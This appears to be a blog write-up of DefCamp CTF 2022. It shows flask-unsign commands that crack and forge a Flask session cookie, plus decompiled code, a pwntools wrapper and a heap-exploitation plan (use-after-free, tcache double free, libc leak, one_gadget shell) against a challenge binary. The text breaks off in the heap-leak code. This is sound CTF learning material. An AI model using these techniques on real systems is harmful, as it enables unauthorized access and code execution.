<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>DefCamp CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="DefCamp CTF 2022">
  <meta name="twitter:description" content="Writeup for DefCamp CTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/defcamp-ctf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="DefCamp CTF 2022">
  <meta property="og:description" content="Writeup for DefCamp CTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-02-14T20:02:14+07:00">
    <meta property="article:modified_time" content="2023-02-23T18:03:33+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="DefCampCTF">
    <meta property="article:tag" content="Heap">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Flask">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/defcamp-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/dicectf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/pragyan-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "DefCamp CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/defcamp-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, DefCampCTF, heap, pwn, web, flask, 2022","wordcount":  2946 ,
        "url": "https:\/\/chovid99.github.io\/posts\/defcamp-ctf-2022\/","datePublished": "2022-02-14T20:02:14+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DefCamp CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Feb 14, 2022">Feb 14, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2946 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#web-intro">web-intro</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#cache">Cache</a>
          <ul>
            <li><a href="#intro">Intro</a></li>
            <li><a href="#initial-analysis">Initial analysis</a></li>
            <li><a href="#pitfall-solution">Pitfall solution</a></li>
            <li><a href="#further-analysis">Further analysis</a>
              <ul>
                <li><a href="#idea-explanation">Idea explanation</a></li>
                <li><a href="#leak-heap-address">Leak heap address</a></li>
                <li><a href="#create-forged-chunk">Create forged chunk</a></li>
                <li><a href="#make-student_pointer-to-point-the-forged-chunk">Make student_pointer to point the forged chunk</a></li>
                <li><a href="#leak-libc-base-address">Leak libc base address</a></li>
                <li><a href="#final-step">Final step</a></li>
              </ul>
            </li>
            <li><a href="#full-solution">Full Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>On this CTF, I only managed to solve two challenges, the web-intro and cache challenge. However, I&rsquo;m super happy doing this CTF because I learned a lot about heap during doing this CTF. Kudos to the organizers! Here is my writeup for those two challenges.</p>
<h1 id="web">Web</h1>
<h2 id="web-intro">web-intro</h2>
<p>We were given a flask website, where it only show Access Denied. Checking the cookie, we notice it contains the session. Using flask unsign, we try to bruteforce the secret, and found it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgY8Ag.brYMgM6ScmEf9me5I0-BKia5QTs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;logged_in&#39;: True}&#34;</span> --secret <span class="s1">&#39;password&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}</p></blockquote>
<h1 id="pwn">Pwn</h1>
<h2 id="cache">Cache</h2>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Disclaimer<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">This is my first time doing heap challenge, I spend a lot of time learning while doing it, so I&rsquo;m sorry if I made some mistakes during explaining my solution. Would love to have your comments or feedback if you found some misinformation in my writeup.</div>
        </div>
    </div>
<h3 id="intro">Intro</h3>
<p>We were given a libc and a binary file called <code>vuln</code>.
Checking the given libc, we know that the glibc version is <code>2.27</code></p>
<h3 id="initial-analysis">Initial analysis</h3>
<p>Here is the result of the decompilation with Ghidra</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_24</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">student_pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">code</span> <span class="o">**</span><span class="n">admin_pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">student_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">admin_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;MENU&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1: Make new admin&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2: Make new user&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3: Print admin info&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4: Edit Student Name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;5: Print Student Name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;6: Delete admin&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;7: Delete user&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Choice: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d%*c&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">admin_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">admin_pointer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">admin_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="n">admin_pointer</span> <span class="o">=</span> <span class="n">getFlag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">student_pointer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What is your name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">student_pointer</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="n">admin_pointer</span><span class="p">[</span><span class="mi">1</span><span class="p">])();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What is your name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">student_pointer</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">student_pointer</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;New student has not been created yet&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Students name is %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">student_pointer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">admin_pointer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">student_pointer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;bad input&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading the decompilation result, we notice some bug.</p>
<ul>
<li>Use After Free on admin and student pointer (Because after being freed, the pointer is not set to null).</li>
<li>Double Free due to previous bug and the glibc version</li>
<li>We can easily call a function by calling the menu 3 (print admin info)</li>
</ul>
<h3 id="pitfall-solution">Pitfall solution</h3>
<p>To make our life easier, let&rsquo;s make a wrapper in python to do that:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_student</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;is &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_shell</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_student</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_student</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free_student</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choice: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Skimming the decompiled code, it seems the solution that we need is only abusing the UAF bug:</p>
<ul>
<li>Create Admin</li>
<li>Free it (then the chunk goes to tcache because the malloc size is 0x10)</li>
<li>Create User where the last 8 byte is the <code>getFlag</code> address</li>
<li>Call Print Admin Info (Because <code>admin_pointer</code> and <code>student_pointer</code> is pointing to the same chunk, hence call Print Admin Info will call <code>getFlag</code>).</li>
</ul>
<p>After I did the above steps, turn out the printed flag was a fake flag.</p>
<img src="https://i.imgur.com/OZxjkR9.jpg">
<h3 id="further-analysis">Further analysis</h3>
<p>Seems like we need to trigger shell to look around for the real flag. Basically, our target is to do the above steps, but instead of putting the <code>getFlag</code> address, we trigger the shell.</p>
<h4 id="idea-explanation">Idea explanation</h4>
<p>In order to do that, first I try to find <code>execve(&quot;/bin/sh&quot;</code> on the given libc with <code>one_gadget</code>. We found some candidates.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0x4f2c5 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
</span></span><span class="line"><span class="cl">constraints:
</span></span><span class="line"><span class="cl">  rsp <span class="p">&amp;</span> <span class="nv">0xf</span> <span class="o">==</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">  <span class="nv">rcx</span> <span class="o">==</span> NULL
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0x4f322 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
</span></span><span class="line"><span class="cl">constraints:
</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x40<span class="o">]</span> <span class="o">==</span> NULL
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0x10a38c execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span class="o">)</span>
</span></span><span class="line"><span class="cl">constraints:
</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
</span></span></code></pre></div><p>To use that gadget, we need to leak libc base address. In order to do that, we can&rsquo;t rely on the tcache bin. We need to find a way, so that during we call the <code>free</code>, the chunk got cached inside <code>unsortedbin</code>, because unsorted bin chunk will store pointer to libc <code>main_arena</code>. With UAF, we can leak the libc base address.
How to do that? The main idea is we need to:</p>
<ul>
<li>Forge a chunk with size <code>0x90</code></li>
<li>Free it 7 times (So that tcache[0x90] will be full)</li>
<li>Free it one more time. And then our chunk will go to <code>unsortedbin</code> (If we use size smaller than 0x90, it will go to <code>fastbin</code>)</li>
<li>Using UAF, we can print the chunk data (which contains the libc address of the <code>main_arena</code>)</li>
<li>Reuse the pitfall solution, but instead of <code>getFlag</code> address, we store our shell gadget address</li>
</ul>
<p>Let&rsquo;s do that &#x1f604;</p>
<h4 id="leak-heap-address">Leak heap address</h4>
<p>In order to fulfill that, we need to find the heap_address first. We can use double free to retrieve the heap address:</p>
<ul>
<li>Create new student</li>
<li>Free it (our chunk will go to tcache, and <code>tcache_entry-&gt;next</code> is null)</li>
<li>Free it again (Because we free the same chunk, the single linked list of <code>tcache_entry</code> will create a loop. The tcache[0x20] will be like this<code>student_pointer-&gt;student_pointer-&gt;...</code>)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak heap address by double-free</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
